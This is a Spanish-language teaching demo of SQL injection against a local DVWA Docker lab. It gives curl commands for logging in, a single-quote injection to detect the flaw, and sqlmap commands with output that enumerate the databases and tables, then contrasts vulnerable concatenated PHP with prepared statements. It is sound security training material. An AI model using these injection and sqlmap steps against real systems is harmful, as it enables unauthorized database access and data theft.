Demo SQLi — Paso 0: Setup

Levantar laboratorio DVWA con Docker. Solo entorno local.

# 1. Levantar DVWA
$ docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
# Esperar ~30 segundos a que inicie MySQL
 
# 2. Login (obtener token CSRF)
$ TOKEN=$(curl -s http://localhost/login.php | grep -oP "user_token.*value='\K[^']+")
$ curl -c cookies.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://localhost/login.php
 
# 3. Verificar login
$ curl -b cookies.txt http://localhost/ | grep "Security Level"
Security Level: low

⚠️ Nota Importante

La primera vez, DVWA crea la BD automáticamente. Si falla, abrir http://localhost/setup.php en navegador y click "Create/Reset Database".

🔧 Troubleshooting

1. "Unable to find image" → Normal, esperar descarga (~1-2 min)

2. "Port 80 in use" → docker rm -f dvwa y repetir

3. "Connection refused" → Esperar 30s, MySQL inicia después

Demo SQLi — Paso 1: Detección

Identificar la vulnerabilidad con comillas simples.

# Request normal (con cookies de sesión)
$ curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -E "ID:|First name"
ID: 1
First name: admin
Surname: admin
 
# Request con comilla simple — ERROR = SQLi
$ curl -b cookies.txt "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"
You have an error in your SQL syntax
near ''1''' at line 1

🔍 Análisis — El servidor interpreta:

SELECT * FROM users WHERE id='1''

La comilla extra rompe la query → ERROR

✓ SQLi CONFIRMADO

Error "SQL syntax" = input se inyecta directamente en query SQL sin sanitización.

Demo SQLi — Paso 2: Enumeración

Usar sqlmap para mapear la base de datos.

# 1. Extraer token de sesión para sqlmap
$ SESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')
$ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SESSID; security=low" \
  --batch --dbs
 
available databases [2]:
[*] dvwa
[*] information_schema
 
# 2. Enumerar tablas
$ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SESSID; security=low" \
  --batch -D dvwa --tables
 
[2 tables]
| guestbook |
| users |

⚠️ Aviso Legal

--dbs y --tables solo enumeran, NO modifican datos. Usar solo en sistemas con autorización explícita.

Demo SQLi — Prevención

Cómo defender aplicaciones contra SQL Injection.

❌ CÓDIGO VULNERABLE (PHP)

$id = $_GET['id'];
$query = "SELECT * FROM users 
           WHERE id = '$id'";
$result = mysqli_query($conn, $query);

Input del usuario concat-directo en query

✅ CÓDIGO SEGURO (PHP)

// Prepared Statements (PDO)
$stmt = $pdo->prepare(
  "SELECT * FROM users WHERE id = ?"
);
$stmt->execute([$_GET['id']]);
$result = $stmt->fetch();

Parámetros separados de query

1. Prepared Statements

SIEMPRE usar parámetros

2. Least Privilege

DB user sin admin

3. Input Validation
